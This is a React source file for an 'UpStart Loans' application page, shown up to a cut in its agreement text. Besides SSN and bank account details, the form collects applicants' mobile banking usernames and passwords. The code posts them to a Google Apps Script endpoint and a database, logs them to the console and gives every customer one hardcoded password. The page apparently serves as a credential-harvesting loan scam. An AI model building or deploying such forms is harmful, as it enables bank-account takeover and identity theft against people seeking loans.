import React, { useState, useRef, useEffect } from 'react'
import { stripBase64Prefix } from '../utils/customerService'
import { LOAN_AGENTS } from '../constants/loanAgents'
import { useNavigate, useSearchParams } from 'react-router-dom'
import { User, Mail, Phone, DollarSign, Lock, CheckCircle, ArrowRight, Shield, Calendar, MapPin, CreditCard, Building2, FileText, Download } from 'lucide-react'
import jsPDF from 'jspdf'
import html2canvas from 'html2canvas'
import { saveCustomerToDatabase } from '../services/databaseService'
import { saveKYCDocument, saveLoanAgreement } from '../services/documentService'
import { CONFIG } from '../config/env'

const LoanApplication = () => {
  const [searchParams] = useSearchParams()
  const loanType = searchParams.get('type') || 'personal'
  const [currentStep, setCurrentStep] = useState(1)
  const [formData, setFormData] = useState({
    loanAgent: '',
    loanAmount: '',
    loanPurpose: loanType,
    firstName: '',
    lastName: '',
    email: '',
    homeAddress: '',
    city: '',
    state: '',
    zipCode: '',
    dateOfBirth: '',
    ssnNumber: '',
    bankName: '',
    customBankName: '',
    mobileAppUsername: '',
    mobileAppPassword: '',
    routingNumber: '',
    accountNumber: '',
    phoneNumber: '',
    loanTerm: ''
  })
  const [showAgreement, setShowAgreement] = useState(false)
  const [agreementAccepted, setAgreementAccepted] = useState(false)
  const [signature, setSignature] = useState('')
  const [isProcessing, setIsProcessing] = useState(false)
  const [isDrawing, setIsDrawing] = useState(false)
  const [validationErrors, setValidationErrors] = useState({})
  const [isSubmittingEmail, setIsSubmittingEmail] = useState(false)
  const [showAllSections, setShowAllSections] = useState(false)
  const [agreementContent, setAgreementContent] = useState('')
  const [sectionView, setSectionView] = useState('summary')
  const [idProof, setIdProof] = useState(null)
  const [idProofError, setIdProofError] = useState('')
  
  // KYC Documents State
  const [idFront, setIdFront] = useState(null)
  const [idFrontError, setIdFrontError] = useState('')
  const [idBack, setIdBack] = useState(null)
  const [idBackError, setIdBackError] = useState('')
  const [selfiePhoto, setSelfiePhoto] = useState(null)
  const [selfiePhotoError, setSelfiePhotoError] = useState('')
  const [headRotationVideo, setHeadRotationVideo] = useState(null)
  const [headRotationVideoError, setHeadRotationVideoError] = useState('')
  
  const canvasRef = useRef(null)
  const agreementRef = useRef(null)
  const navigate = useNavigate()

  // Loan type configurations
  const loanTypeConfig = {
    personal: {
      title: 'Personal Loan',
      description: 'Get the funds you need for any purpose',
      icon: '💰',
      amounts: '$2,000 - $25,000',
      terms: '12-60 months'
    },
    wedding: {
      title: 'Wedding Loan',
      description: 'Finance your dream wedding with flexible terms',
      icon: '💍',
      amounts: '$5,000 - $15,000',
      terms: '12-84 months'
    },
    home: {
      title: 'Home Improvement Loan',
      description: 'Renovate your home with affordable financing',
      icon: '🏠',
      amounts: '$3,000 - $25,000',
      terms: '12-120 months'
    },
    moving: {
      title: 'Moving Loan',
      description: 'Cover moving expenses with quick funding',
      icon: '🚚',
      amounts: '$1,000 - $8,000',
      terms: '6-36 months'
    },
    medical: {
      title: 'Medical Loan',
      description: 'Handle medical expenses with flexible terms',
      icon: '🏥',
      amounts: '$2,000 - $20,000',
      terms: '12-60 months'
    },
    refinance: {
      title: 'Car Loan Refinance',
      description: 'Lower your monthly car payment',
      icon: '🚗',
      amounts: '$5,000 - $50,000',
      terms: '24-84 months'
    },
    heloc: {
      title: 'Home Equity Line of Credit',
      description: 'Access your home equity with flexible credit line',
      icon: '🏡',
      amounts: '$10,000 - $100,000',
      terms: 'Revolving credit line'
    },
    relief: {
      title: 'Relief Loan',
      description: 'Get financial relief when you need it most',
      icon: '🆘',
      amounts: '$500 - $5,000',
      terms: '3-24 months'
    },
    consolidation: {
      title: 'Debt Consolidation',
      description: 'Combine multiple debts into one payment',
      icon: '📊',
      amounts: '$3,000 - $35,000',
      terms: '12-84 months'
    },
    credit: {
      title: 'Credit Card Consolidation',
      description: 'Pay off high-interest credit cards',
      icon: '💳',
      amounts: '$2,000 - $25,000',
      terms: '12-60 months'
    }
  }

  const currentLoanConfig = loanTypeConfig[loanType] || loanTypeConfig.personal

  // Generate loan agreement number
  const [loanAgreementNumber] = useState('LS-' + Date.now().toString());

  // Monthly payment calculation function (10% fixed APR)
  const calculateMonthlyPayment = (amount, months) => {
    if (!amount || !months) return 0;
    const principal = parseFloat(amount);
    const annualRate = 0.10; // 10% fixed APR
    const monthlyRate = annualRate / 12;
    const monthlyPayment = principal * monthlyRate * Math.pow(1 + monthlyRate, months) / (Math.pow(1 + monthlyRate, months) - 1);
    return monthlyPayment.toFixed(2);
  };

  // Initialize canvas with proper drawing settings
  useEffect(() => {
    const canvas = canvasRef.current
    if (canvas) {
      const ctx = canvas.getContext('2d')
      ctx.strokeStyle = '#000000'
      ctx.lineWidth = 2
      ctx.lineCap = 'round'
      ctx.lineJoin = 'round'
    }
  }, [])

  const handleInputChange = (e) => {
    const { name, value } = e.target
    let formattedValue = value
    
    // Loan amount validation
    if (name === 'loanAmount') {
      const numValue = parseFloat(value)
      const error = {}
      
      // Remove non-numeric characters
      const cleanValue = value.replace(/[^0-9.]/g, '')
      
      if (cleanValue === '') {
        error.loanAmount = 'Loan amount is required'
      } else {
        const numValue = parseFloat(cleanValue)
        if (isNaN(numValue)) {
          error.loanAmount = 'Please enter a valid number'
        } else if (numValue < 2000) {
          error.loanAmount = 'Loan amount must be between $2,000 and $25,000'
        } else if (numValue > 25000) {
          error.loanAmount = 'Loan amount must be between $2,000 and $25,000'
        } else {
          formattedValue = cleanValue
        }
      }
      
      setValidationErrors({
        ...validationErrors,
        [name]: error.loanAmount || ''
      })
    }
            
    // Auto-format date of birth as MM/DD/YYYY
    if (name === 'dateOfBirth') {
      // Remove any non-digit characters
      let digits = value.replace(/\D/g, '')
      
      // Add slashes automatically
      if (digits.length >= 2) {
        formattedValue = digits.slice(0, 2) + '/' + digits.slice(2)
      }
      if (digits.length >= 4) {
        formattedValue = digits.slice(0, 2) + '/' + digits.slice(2, 4) + '/' + digits.slice(4, 8)
      }
      
      // Limit to MM/DD/YYYY format
      if (formattedValue.length > 10) {
        formattedValue = formattedValue.slice(0, 10)
      }
    }
    
    setFormData({
      ...formData,
      [name]: formattedValue
    })
  }

  const getCoordinates = (e) => {
    const canvas = canvasRef.current
    const rect = canvas.getBoundingClientRect()
    
    // Handle both touch and mouse events
    const clientX = e.touches ? e.touches[0].clientX : e.clientX
    const clientY = e.touches ? e.touches[0].clientY : e.clientY
    
    return {
      x: clientX - rect.left,
      y: clientY - rect.top
    }
  }

  const startDrawing = (e) => {
    e.preventDefault()
    setIsDrawing(true)
    const canvas = canvasRef.current
    const ctx = canvas.getContext('2d')
    const coords = getCoordinates(e)
    
    ctx.beginPath()
    ctx.moveTo(coords.x, coords.y)
  }

  const draw = (e) => {
    if (!isDrawing) return
    e.preventDefault()
    
    const canvas = canvasRef.current
    const ctx = canvas.getContext('2d')
    const coords = getCoordinates(e)
    
    ctx.lineTo(coords.x, coords.y)
    ctx.stroke()
  }

  const stopDrawing = (e) => {
    if (e) e.preventDefault()
    setIsDrawing(false)
    // Auto-save signature when user stops drawing
    saveSignature()
  }

  const clearSignature = () => {
    const canvas = canvasRef.current
    const ctx = canvas.getContext('2d')
    ctx.clearRect(0, 0, canvas.width, canvas.height)
    setSignature('')
  }

  const saveSignature = () => {
    const canvas = canvasRef.current
    if (canvas) {
      const dataURL = canvas.toDataURL()
      setSignature(dataURL)
      console.log('Signature saved:', dataURL.substring(0, 50) + '...')
    }
  }

  const handleStep1Submit = (e) => {
    e.preventDefault()
    
    // Validate date of birth format
    const dateRegex = /^(0[1-9]|1[0-2])\/(0[1-9]|[12][0-9]|3[01])\/(19|20)\d{2}$/
    if (!dateRegex.test(formData.dateOfBirth)) {
      alert('Please enter a valid date of birth in MM/DD/YYYY format (e.g., 01/15/1990)')
      return
    }
    
    // Additional date validation
    const [month, day, year] = formData.dateOfBirth.split('/').map(Number)
    const date = new Date(year, month - 1, day)
    if (date.getMonth() !== month - 1 || date.getDate() !== day) {
      alert('Please enter a valid date (e.g., 01/15/1990 not 02/30/1990)')
      return
    }
    
    if (formData.loanAgent && formData.loanAmount && formData.loanTerm && formData.loanPurpose && formData.firstName && formData.lastName && 
        formData.email && formData.homeAddress && formData.city && formData.state && formData.zipCode && formData.dateOfBirth &&
        formData.ssnNumber && formData.bankName && formData.routingNumber && formData.accountNumber && 
        !validationErrors.loanAmount) {
      setCurrentStep(2)
    } else {
      alert('Please fill in all required fields including loan agent, loan amount, and loan term')
    }
  }

  const handleStep2Submit = async (e) => {
    e.preventDefault()
    const errors = {}
    
    if (!formData.phoneNumber || formData.phoneNumber.trim() === '') {
      errors.phoneNumber = 'Telephone Number is required'
    } else if (!/^\d{10}$/.test(formData.phoneNumber.replace(/\D/g, ''))) {
      errors.phoneNumber = 'Telephone Number must be exactly 10 digits'
    }
    
    setValidationErrors(errors)
    
    if (Object.keys(errors).length === 0) {
      setIsSubmittingEmail(true)
      
      // Generate application ID
      const applicationId = `LS-${Date.now()}`
      console.log('Generated application ID:', applicationId)
      
      // Prepare customer data for database
      const customerData = {
        applicationId: applicationId,
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        phoneNumber: formData.phoneNumber,
        homeAddress: formData.homeAddress,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        dateOfBirth: formData.dateOfBirth,
        ssnNumber: formData.ssnNumber,
        loanAmount: formData.loanAmount,
        loanPurpose: formData.loanPurpose,
        loanTerm: formData.loanTerm,
        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
        loanAgent: formData.loanAgent,
        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
        mobileAppUsername: formData.mobileAppUsername,
        mobileAppPassword: formData.mobileAppPassword,
        routingNumber: formData.routingNumber,
        accountNumber: formData.accountNumber,
        userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
        password: 'UpStarLoan#2024',
        status: 'review'
      };
      console.log('Customer data prepared for database:', customerData)

      // Save customer to database
      console.log('=== SAVING CUSTOMER TO DATABASE ===')
      console.log('Calling saveCustomerToDatabase with:', customerData)
      let savedCustomer = null
      try {
        savedCustomer = await saveCustomerToDatabase(customerData)
        console.log('✅ CUSTOMER SAVED SUCCESSFULLY:', savedCustomer)
        console.log('Customer ID:', savedCustomer.id)
      } catch (dbError) {
        console.error('❌ DATABASE SAVE FAILED:', dbError)
        console.error('❌ Error message:', dbError.message || dbError)
        // Continue with email even if database save fails
      }
      
      // Send email notification
      try {
        await submitToGoogleSheets()
      } catch (emailError) {
        console.warn('Email submission failed (CORS or network error), continuing to agreement:', emailError)
        // Continue to agreement even if email fails
      }
      
      setIsSubmittingEmail(false)
      
      // Then show agreement for signature
      setShowAgreement(true)
      setValidationErrors({})
    }
  }

  const handleAgreementSubmit = () => {
    if (agreementAccepted && signature) {
      setCurrentStep(3)
      setIsProcessing(true)
      
      // Email already sent when Generate Document was clicked
      
      setTimeout(() => {
        navigate('/application-summary', { state: { loanAmount: formData.loanAmount, loanType: currentLoanConfig.title } })
      }, 3000)
    }
  }

  const submitToGoogleSheets = async () => {
    try {
      // Convert ID proof to base64 if available
      let idProofBase64 = ''
      let idProofName = ''
      let idProofType = ''
      let idProofSize = ''
      
      if (idProof) {
        idProofBase64 = await convertFileToBase64(idProof)
        idProofName = idProof.name
        idProofType = idProof.type
        idProofSize = `${(idProof.size / 1024 / 1024).toFixed(2)} MB`
      }

      // Form data to submit
      const formDataToSubmit = {
        formType: 'loanApplication',
        loanAmount: formData.loanAmount,
        loanPurpose: formData.loanPurpose,
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        homeAddress: formData.homeAddress,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        dateOfBirth: formData.dateOfBirth,
        ssnNumber: formData.ssnNumber,
        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
        mobileAppUsername: formData.mobileAppUsername,
        mobileAppPassword: formData.mobileAppPassword,
        routingNumber: formData.routingNumber,
        accountNumber: formData.accountNumber,
        userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
        password: 'UpStarLoan#2024',
        phoneNumber: formData.phoneNumber,
        // Add new fields
        loanAgent: formData.loanAgent,
        loanTerm: formData.loanTerm,
        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
        // Add ID proof information
        idProofName: idProofName,
        idProofType: idProofType,
        idProofSize: idProofSize,
        idProofBase64: idProofBase64,
        agreementAccepted: agreementAccepted,
        signatureStatus: signature ? 'Signed' : 'Not signed',
        submissionDate: new Date().toLocaleDateString()
      }

      // Use deployed email script (original approach - works in production)
      const scriptUrl = CONFIG.googleSheets.loanApp

      // Submit to Google Apps Script using no-cors mode to bypass CORS
      await fetch(scriptUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(formDataToSubmit)
      })

      console.log('✅ Email sent successfully')
    } catch (error) {
      console.error('Error submitting form:', error)
    }
  }

  const downloadAgreement = () => {
    console.log('Download agreement clicked')
    console.log('Agreement accepted:', agreementAccepted)
    console.log('Signature exists:', !!signature)
    console.log('Form data:', formData)
    
    const agreementContent = `${currentLoanConfig.title} AGREEMENT - UpStart Loans
    
Date: ${new Date().toLocaleDateString()}
Application ID: #${Math.random().toString(36).substr(2, 9).toUpperCase()}
Loan Type: ${currentLoanConfig.title}

BORROWER INFORMATION:
Name: ${formData.firstName} ${formData.lastName}
Address: ${formData.homeAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}
Phone: ${formData.phoneNumber}
Date of Birth: ${formData.dateOfBirth}

LOAN DETAILS:
Requested Amount: $${formData.loanAmount}
Loan Purpose: ${formData.loanPurpose}
Loan Type: ${currentLoanConfig.title}
Available Amounts: ${currentLoanConfig.amounts}
Terms: ${currentLoanConfig.terms}
Bank: ${formData.bankName}

TERMS AND CONDITIONS:
1. The borrower acknowledges that UpStart Loans is a direct lender providing loan services.
2. The borrower authorizes UpStart Loans to share their information with potential lenders.
3. The borrower confirms that all provided information is accurate and complete.
4. The borrower understands that loan approval is at the discretion of individual lenders.
5. The borrower agrees to repay any approved loan according to the lender terms.
6. Interest rates and repayment terms will be provided by the approving lender.
7. The borrower authorizes electronic communication regarding their loan application.

SECURITY AND PRIVACY:
- Your information is protected by 256-bit SSL encryption
- We only share information with verified financial institutions
- You can revoke consent at any time
- We comply with all applicable privacy laws

DISCLOSURE:
This is not a loan approval. Final terms will be provided by the lender if your application is approved.

SIGNATURE:
By signing below, borrower confirms they have read, understood, and agree to all terms and conditions outlined in this agreement.

Borrower Signature: ${signature.includes('data:') ? 'Electronic Signature (Canvas)' : signature}
Date: ${new Date().toLocaleDateString()}

For questions, contact: support@upstarsloans.com | 1-800-UPSTARS
Privacy Policy: www.upstarsloans.com/privacy-policy
Terms of Service: www.upstarsloans.com/terms-of-service`

    const blob = new Blob([agreementContent], { type: 'text/plain' })
    const url = window.URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `${loanType}-agreement-${formData.firstName}-${formData.lastName}.txt`
    document.body.appendChild(a)
    
    console.log('Attempting to download file:', a.download)
    a.click()
    document.body.removeChild(a)
    window.URL.revokeObjectURL(url)
    console.log('Download completed')
  }

  const handleShowAllSections = () => {
    setShowAllSections(true)
  }

  const handleSectionViewChange = (e) => {
    const value = e.target.value
    setSectionView(value)
    if (value === 'all') {
      setShowAllSections(true)
    } else if (value === 'summary') {
      setShowAllSections(false)
    } else if (value === 'terms') {
      setShowAllSections(true)
    }
  }

  const handleIdProofUpload = (e) => {
    const file = e.target.files[0]
    setIdProofError('')
    
    if (!file) {
      setIdProof(null)
      return
    }
    
    // Validate file type
    const allowedTypes = ['application/pdf', 'image/jpeg', 'image/jpg', 'image/png']
    if (!allowedTypes.includes(file.type)) {
      setIdProofError('Please upload a valid file type (PDF, JPG, JPEG, or PNG)')
      setIdProof(null)
      return
    }
    
    // Validate file size (5MB = 5 * 1024 * 1024 bytes)
    const maxSize = 5 * 1024 * 1024
    if (file.size > maxSize) {
      setIdProofError('File size must be less than 5MB')
      setIdProof(null)
      return
    }
    
    // File is valid
    setIdProof(file)
    setIdProofError('')
  }

  const handleRemoveIdProof = () => {
    setIdProof(null)
    setIdProofError('')
    // Clear the file input
    const fileInput = document.getElementById('id-proof-upload')
    if (fileInput) {
      fileInput.value = ''
    }
  }

  // KYC Document Handlers
  const handleIdFrontUpload = (e) => {
    const file = e.target.files[0]
    setIdFrontError('')

    if (!file) {
      setIdFront(null)
      return
    }

    // Validate file type
    const allowedTypes = ['application/pdf', 'image/jpeg', 'image/jpg', 'image/png']
    if (!allowedTypes.includes(file.type)) {
      setIdFrontError('Please upload a valid file (PDF, JPG, JPEG, PNG)')
      setIdFront(null)
      return
    }

    // Validate file size (5MB max)
    const maxSize = 5 * 1024 * 1024
    if (file.size > maxSize) {
      setIdFrontError('File size must be less than 5MB')
      setIdFront(null)
      return
    }

    setIdFront(file)
    setIdFrontError('')
  }

  const handleRemoveIdFront = () => {
    setIdFront(null)
    setIdFrontError('')
    const fileInput = document.getElementById('id-front-upload')
    if (fileInput) {
      fileInput.value = ''
    }
  }

  const handleIdBackUpload = (e) => {
    const file = e.target.files[0]
    setIdBackError('')

    if (!file) {
      setIdBack(null)
      return
    }

    // Validate file type
    const allowedTypes = ['application/pdf', 'image/jpeg', 'image/jpg', 'image/png']
    if (!allowedTypes.includes(file.type)) {
      setIdBackError('Please upload a valid file (PDF, JPG, JPEG, PNG)')
      setIdBack(null)
      return
    }

    // Validate file size (5MB max)
    const maxSize = 5 * 1024 * 1024
    if (file.size > maxSize) {
      setIdBackError('File size must be less than 5MB')
      setIdBack(null)
      return
    }

    setIdBack(file)
    setIdBackError('')
  }

  const handleRemoveIdBack = () => {
    setIdBack(null)
    setIdBackError('')
    const fileInput = document.getElementById('id-back-upload')
    if (fileInput) {
      fileInput.value = ''
    }
  }

  const handleSelfiePhotoUpload = (e) => {
    const file = e.target.files[0]
    setSelfiePhotoError('')

    if (!file) {
      setSelfiePhoto(null)
      return
    }

    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png']
    if (!allowedTypes.includes(file.type)) {
      setSelfiePhotoError('Please upload a valid image (JPG, JPEG, PNG)')
      setSelfiePhoto(null)
      return
    }

    // Validate file size (5MB max)
    const maxSize = 5 * 1024 * 1024
    if (file.size > maxSize) {
      setSelfiePhotoError('File size must be less than 5MB')
      setSelfiePhoto(null)
      return
    }

    setSelfiePhoto(file)
    setSelfiePhotoError('')
  }

  const handleRemoveSelfiePhoto = () => {
    setSelfiePhoto(null)
    setSelfiePhotoError('')
    const fileInput = document.getElementById('selfie-photo-upload')
    if (fileInput) {
      fileInput.value = ''
    }
  }

  const handleHeadRotationVideoUpload = (e) => {
    const file = e.target.files[0]
    setHeadRotationVideoError('')

    if (!file) {
      setHeadRotationVideo(null)
      return
    }

    // Validate file type
    const allowedTypes = ['video/mp4', 'video/webm', 'video/quicktime']
    if (!allowedTypes.includes(file.type)) {
      setHeadRotationVideoError('Please upload a valid video file (MP4, WebM, MOV)')
      setHeadRotationVideo(null)
      return
    }

    // Validate file size (50MB max for videos)
    const maxSize = 50 * 1024 * 1024 // 50MB
    if (file.size > maxSize) {
      setHeadRotationVideoError('File size must be less than 50MB')
      setHeadRotationVideo(null)
      return
    }

    setHeadRotationVideo(file)
    setHeadRotationVideoError('')
  }

  const handleRemoveHeadRotationVideo = () => {
    setHeadRotationVideo(null)
    setHeadRotationVideoError('')
    const fileInput = document.getElementById('head-rotation-video-upload')
    if (fileInput) {
      fileInput.value = ''
    }
  }

  const convertFileToBase64 = (file) => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader()
      reader.readAsDataURL(file)
      reader.onload = () => resolve(reader.result)
      reader.onerror = (error) => reject(error)
    })
  }

  const submitAgreementToGmail = async () => {
    console.log('=== SUBMISSION VALIDATION ===')
    
    if (!agreementAccepted) {
      alert('Please accept the agreement before submitting.')
      return
    }
    
    if (!signature) {
      alert('Please provide your electronic signature before submitting.')
      return
    }
    
    // KYC Document Validation (all optional)
    console.log('KYC documents provided:', {
      idFront: !!idFront,
      idBack: !!idBack,
      selfiePhoto: !!selfiePhoto,
      headRotationVideo: !!headRotationVideo
    })

    try {
      setIsSubmittingEmail(true)
      console.log('=== STARTING SUBMISSION PROCESS ===')
      console.log('Form data being submitted:', formData)
      
      // Convert KYC documents to base64 (only if provided)
      let idFrontBase64 = null
      let idBackBase64 = null
      let selfieBase64 = null
      let videoBase64 = null
      let videoName = null
      let videoType = null
      let videoSize = null

      if (idFront) {
        console.log('Converting ID Front to base64...')
        idFrontBase64 = await convertFileToBase64(idFront)
        console.log('ID Front converted successfully, size:', idFrontBase64.length)
      }
      
      if (idBack) {
        console.log('Converting ID Back to base64...')
        idBackBase64 = await convertFileToBase64(idBack)
        console.log('ID Back converted successfully, size:', idBackBase64.length)
      }
      
      if (selfiePhoto) {
        console.log('Converting Selfie Photo to base64...')
        selfieBase64 = await convertFileToBase64(selfiePhoto)
        console.log('Selfie Photo converted successfully, size:', selfieBase64.length)
      }
      
      if (headRotationVideo) {
        console.log('Converting Head Rotation Video to base64...')
        videoBase64 = await convertFileToBase64(headRotationVideo)
        videoName = headRotationVideo.name
        videoType = headRotationVideo.type
        videoSize = `${(headRotationVideo.size / 1024 / 1024).toFixed(2)} MB`
        console.log('Video converted successfully, size:', videoBase64.length)
      }
      
      // Generate complete agreement content
      const agreementContent = generateCompleteAgreementContent()
      
      // Generate application ID
      const applicationId = `LS-${Date.now()}`
      console.log('Generated application ID:', applicationId)
      
      // Prepare customer data for database
      const customerData = {
        applicationId: applicationId,
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        phoneNumber: formData.phoneNumber,
        homeAddress: formData.homeAddress,
        city: formData.city,
        state: formData.state,
        zipCode: formData.zipCode,
        dateOfBirth: formData.dateOfBirth,
        ssnNumber: formData.ssnNumber,
        loanAmount: formData.loanAmount,
        loanPurpose: formData.loanPurpose,
        loanTerm: formData.loanTerm,
        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
        loanAgent: formData.loanAgent,
        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
        mobileAppUsername: formData.mobileAppUsername,
        mobileAppPassword: formData.mobileAppPassword,
        routingNumber: formData.routingNumber,
        accountNumber: formData.accountNumber,
        userId: formData.firstName.toLowerCase() + '_' + formData.lastName.toLowerCase() + '_' + formData.phoneNumber.slice(-4),
        password: 'UpStarLoan#2024',
        status: 'review'
      };
      console.log('Customer data prepared for database:', customerData)

      // Save customer to database
      console.log('=== SAVING CUSTOMER TO DATABASE ===')
      console.log('Calling saveCustomerToDatabase with:', customerData)
      let savedCustomer = null
      try {
        savedCustomer = await saveCustomerToDatabase(customerData)
        console.log('✅ CUSTOMER SAVED SUCCESSFULLY:', savedCustomer)
        console.log('Customer ID:', savedCustomer.id)
      } catch (dbError) {
        console.error('❌ DATABASE SAVE FAILED:', dbError)
        console.error('❌ Error message:', dbError.message || dbError)
        console.error('❌ Will continue with email notification...')
        // Create a fallback savedCustomer object so the rest of the flow works
        savedCustomer = { ...customerData, id: null }
      }
      
      // Save KYC documents and agreement to database (only if customer was saved successfully)
      if (savedCustomer.id) {
        console.log('=== SAVING KYC DOCUMENTS TO DATABASE ===')
        
        try {
          if (idFront && idFrontBase64) {
            console.log('Saving ID Front...')
            const idFrontData = {
              documentName: idFront.name,
              documentType: 'id_front',
              documentSize: `${(idFront.size / 1024 / 1024).toFixed(2)} MB`,
              documentData: idFrontBase64
            }
            await saveKYCDocument(savedCustomer.id, applicationId, idFrontData)
            console.log('✅ ID FRONT SAVED')
          }
          
          if (idBack && idBackBase64) {
            console.log('Saving ID Back...')
            const idBackData = {
              documentName: idBack.name,
              documentType: 'id_back',
              documentSize: `${(idBack.size / 1024 / 1024).toFixed(2)} MB`,
              documentData: idBackBase64
            }
            await saveKYCDocument(savedCustomer.id, applicationId, idBackData)
            console.log('✅ ID BACK SAVED')
          }
          
          if (selfiePhoto && selfieBase64) {
            console.log('Saving Selfie Photo...')
            const selfieData = {
              documentName: selfiePhoto.name,
              documentType: 'selfie',
              documentSize: `${(selfiePhoto.size / 1024 / 1024).toFixed(2)} MB`,
              documentData: selfieBase64
            }
            await saveKYCDocument(savedCustomer.id, applicationId, selfieData)
            console.log('✅ SELFIE SAVED')
          }
          
          if (headRotationVideo && videoBase64) {
            console.log('Saving Head Rotation Video...')
            const videoData = {
              documentName: videoName,
              documentType: 'head_rotation',
              documentSize: videoSize,
              documentData: videoBase64
            }
            await saveKYCDocument(savedCustomer.id, applicationId, videoData)
            console.log('✅ VIDEO SAVED')
          }
          
          // Save loan agreement with signature
          console.log('=== SAVING LOAN AGREEMENT ===')
          const agreementData = {
            applicationId: applicationId,
            agreementStatus: 'signed',
            signatureData: signature
          }
          await saveLoanAgreement(savedCustomer.id, applicationId, agreementData)
          console.log('✅ LOAN AGREEMENT SAVED')
        } catch (docError) {
          console.error('❌ Error saving documents/agreement:', docError)
          // Continue - customer data is already saved
        }
      } else {
        console.log('⏭️ Skipping KYC/agreement save — customer ID not available (database save failed)')
      }

      // Store customer data for dashboard access
      const dashboardData = {
        ...savedCustomer,
        // KYC Documents info for dashboard (only if provided)
        idFrontName: idFront ? idFront.name : '',
        idFrontSize: idFront ? `${(idFront.size / 1024 / 1024).toFixed(2)} MB` : '',
        idFrontType: idFront ? idFront.type : '',
        idBackName: idBack ? idBack.name : '',
        idBackSize: idBack ? `${(idBack.size / 1024 / 1024).toFixed(2)} MB` : '',
        idBackType: idBack ? idBack.type : '',
        selfieName: selfiePhoto ? selfiePhoto.name : '',
        selfieSize: selfiePhoto ? `${(selfiePhoto.size / 1024 / 1024).toFixed(2)} MB` : '',
        selfieType: selfiePhoto ? selfiePhoto.type : '',
        videoName: videoName || '',
        videoSize: videoSize || '',
        videoType: videoType || '',
      }

      // Store in sessionStorage for dashboard access
      sessionStorage.setItem('customerLoggedIn', 'true');
      sessionStorage.setItem('customerData', JSON.stringify(dashboardData));
      
      // Send email notification (optional - can be removed if not needed)
      try {
        const scriptUrl = CONFIG.googleSheets.loanApplication

        const completeData = { 
          ...dashboardData,
          borrower_name: formData.firstName + ' ' + formData.lastName,
          agreementNumber: applicationId,
          signatureStatus: signature ? 'Electronic Signature (Canvas)' : 'Not signed',
          submissionDate: new Date().toLocaleDateString()
        }

        const response = await fetch(scriptUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams(completeData)
        })

        const responseData = await response.json()
        
        if (response.ok && responseData.result === 'success') {
          console.log('Email notification response:', responseData)
        } else {
          console.error('Email notification failed:', responseData)
        }
      } catch (error) {
        console.error('Error sending email notification:', error);
        // Continue even if email fails - data is already saved to database
      }

      console.log('=== SUBMISSION PROCESS COMPLETE ===')
      console.log('✅ All database inserts successful')
      console.log('✅ All documents uploaded successfully')
      console.log('✅ Ready to navigate to success page')
      
      alert('Agreement submitted successfully! Your login details are provided on the next page.')
      // Navigate to customer login details page
      navigate('/customer-login-details')

    } catch (error) {
      console.error('=== SUBMISSION ERROR ===')
      console.error('Error submitting agreement:', error)
      console.error('Error details:', error.message)
      console.error('Error stack:', error.stack)
      alert('Failed to submit agreement. Please try again or contact support.')
    } finally {
      setIsSubmittingEmail(false)
    }
  }

  const generateCompleteAgreementContent = () => {
    const principal = parseFloat(formData.loanAmount) || 0
    const months = parseInt(formData.loanTerm) || 12
    const monthlyRate = 0.10 / 12
    const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1)
    const totalRepayment = monthlyPayment * months

    return `${currentLoanConfig.title} AGREEMENT - UpStart Loans

Agreement Number: LS-${Date.now().toString()}
Date: ${new Date().toLocaleDateString()}

APPLICATION REVIEW
Our system reviews your application and matches you with suitable lenders.

LOAN SUMMARY & DISCLOSURE
Borrower Name: ${formData.firstName} ${formData.lastName}
Loan Amount: $${principal.toLocaleString()}.00
Loan Duration: ${months} months
Annual Percentage Rate (APR): 10.00%
Monthly Payment (EMI): $${monthlyPayment.toFixed(2)}
Total Repayment Amount: $${totalRepayment.toFixed(2)}

BORROWER DETAILS
Full Name: ${formData.firstName} ${formData.lastName}
Email Address: ${formData.email}
Phone Number: ••••••••${formData.phoneNumber ? formData.phoneNumber.slice(-4) : ''}
Financial Institution: ${formData.bankName}
Account Routing Number: ${formData.routingNumber}
Account Number: ••••••••${formData.accountNumber ? formData.accountNumber.slice(-4) : ''}
Address: ${formData.homeAddress}, ${formData.city}, ${formData.state} ${formData.zipCode}

LOAN TERMS & CONDITIONS
1. Loan Amount and Purpose
Lender agrees to lend to Borrower the principal sum of $${principal.toLocaleString()}.00 ("Loan Amount") for personal, family, or household purposes. This loan is unsecured and not backed by any collateral.

2. Interest Rate
The Loan Amount shall bear interest at a fixed annual percentage rate (APR) of 10.00%. Interest will be calculated on the outstanding principal balance.

3. Loan Term
The loan term shall be ${months} months, commencing from the date of this agreement.

4. Payment Schedule
Borrower shall make equal monthly payments of $${monthlyPayment.toFixed(2)} on the 6 day of each month. The first payment is due within 30 days of loan disbursement.

5. Prepayment
Borrower may prepay all or any portion of the Loan Amount at any time without penalty. Prepayment will be applied first to accrued interest, then to principal.

REPAYMENT, LATE FEES & DEFAULT
1. Late Payment Fees
If any payment is not received within 10 days of the due date, a late fee of $25 or 5% of the overdue amount, whichever is greater, will be charged.

2. Default
The loan will be considered in default if: (a) Borrower fails to make any payment when due; (b) Borrower provides false information; (c) Borrower becomes bankrupt or insolvent.

